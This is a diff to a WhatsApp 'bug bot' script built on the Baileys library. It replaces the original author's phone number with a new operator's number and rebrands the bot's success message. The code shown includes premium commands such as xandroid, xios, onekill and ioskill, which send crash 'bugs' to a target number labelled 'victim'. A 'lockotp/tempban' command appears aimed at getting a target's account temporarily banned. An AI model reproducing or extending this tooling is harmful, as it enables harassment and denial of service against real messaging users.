@@ -4,7 +4,7 @@
 //Instagram: unicorn_xeon13
 //Telegram: t.me/xeonbotinc
 //GitHub: @DGXeon
-//WhatsApp: +916909137213
+//WhatsApp: +2348187637779
 //want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
 
 const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
@@ -2285,7 +2285,7 @@ case "xandroid": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348187637779") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2317,7 +2317,7 @@ case "xios": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348187637779") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2433,7 +2433,7 @@ case "xios2":
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348187637779") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2465,7 +2465,7 @@ case "xsysui": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348187637779") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2490,13 +2490,13 @@ let cleanedNumber = text.replace(/[^0-9]/g, '');
 if (cleanedNumber.startsWith('0')) return replygcxeon(`Example : ${prefix+command} 916909137213`)
 var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348187637779") {
     return;
     }
-    if (cleanedNumber == "919366316008") {
+    if (cleanedNumber == "2348187637779") {
     return;
     }
-    if (cleanedNumber == "919402104403") {
+    if (cleanedNumber == "2348187637779") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2618,18 +2618,18 @@ await replygcxeon(`In process....`)
 				break;
 				case 'xpayment': {
 					if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Usage .${command} 916909137213`)
+if (!text) return replygcxeon(`Usage .${command} 2348187637779`)
 let cleanedNumber = text.replace(/[^0-9]/g, '');
 if (cleanedNumber.startsWith('0')) return replygcxeon(`Example : ${prefix+command} 916909137213`)
 var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348187637779") {
     return;
     }
-    if (cleanedNumber == "919366316008") {
+    if (cleanedNumber == "2348187637779") {
     return;
     }
-    if (cleanedNumber == "919402104403") {
+    if (cleanedNumber == "2348187637779") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2673,7 +2673,7 @@ var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
 				break;
 		case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!q) return replygcxeon(`Usage .${command} 916909137213`)
+if (!q) return replygcxeon(`Usage .${command} 2348187637779`)
 let xeonyvictim = q.replace(/[^0-9]/g, "")
 if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
 let target = xeonyvictim + '@s.whatsapp.net'
@@ -2686,7 +2686,7 @@ await locationxeony(target, force)
 await blackening(target, force2)
 await locationxeony(target, force)
 }
-await replygcxeon(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
+await replygcxeon(`Es Teams has Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
 }
 break
 case 'ioskill': case 'iosx': {
@@ -2824,7 +2824,7 @@ case 'lockotp': case 'tempban': {
 	if (!isPremium) return replygcxeon(mess.prem)
   if (args.length < 1) return replygcxeon(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
   const args2 = args[0].split('|');
-  if (args2.length !== 2) return replygcxeon(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
+  if (args2.length !== 2) return replygcxeon(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 234|8187637779`);
   const xeonCountryCode = args2[0];
   const xtarget = args2[1];
   const xeonNumber = xtarget.replace('@s.whatsapp.net', '');
